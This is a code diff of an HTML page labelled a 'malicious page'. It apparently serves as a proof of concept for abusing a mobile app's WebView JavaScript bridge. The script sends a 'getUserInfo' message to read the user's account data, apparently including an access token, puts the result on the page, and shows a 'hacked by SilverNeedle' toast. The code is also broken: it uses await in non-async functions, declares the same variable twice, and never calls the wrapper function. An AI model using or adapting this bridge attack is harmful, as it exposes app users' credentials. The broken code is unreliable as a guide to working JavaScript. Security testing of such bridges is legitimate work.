@@ -23,16 +23,23 @@
     </style>
 </head>
 <body>
-    <h1 id="text">恶意页面 1</h1>
-    <button onclick="getAT()">点击我获取用户AT</button>
-    <button onclick="toast()">点击我发送消息</button>
+    <h1 id="text">恶意页面 2</h1>
+
     <script>
         window.onload = function() {
-            let str1 = "{'type':'getUserInfo', 'msgId':10086}";
-            let ret = await window.HmsMapsJsBridge.postMessage(str1);
-            document.getElementById("text").innerText = ret;
-            let str2 = "{'type':'toast', 'msgId':10086, 'data':{'message':'hacked by SilverNeedle😄'}}";
-            let ret = await window.HmsMapsJsBridge.postMessage(str2);
+            var hack = function() {
+                try {
+                    let str1 = "{'type':'getUserInfo', 'msgId':10086}";
+                    let ret = await window.HmsMapsJsBridge.postMessage(str1);
+                    document.getElementById("text").innerText = ret;
+                    let str2 = "{'type':'toast', 'msgId':10086, 'data':{'message':'hacked by SilverNeedle😄'}}";
+                    let ret = await window.HmsMapsJsBridge.postMessage(str2);
+                } catch (error) {
+                    console.error('执行出错', error);
+                    alert('执行出错' + error.message);
+                }
+            }
+            
         }
         // function getAT() {
         //     // document.getElementById("text").innerText = "文本已被修改！";
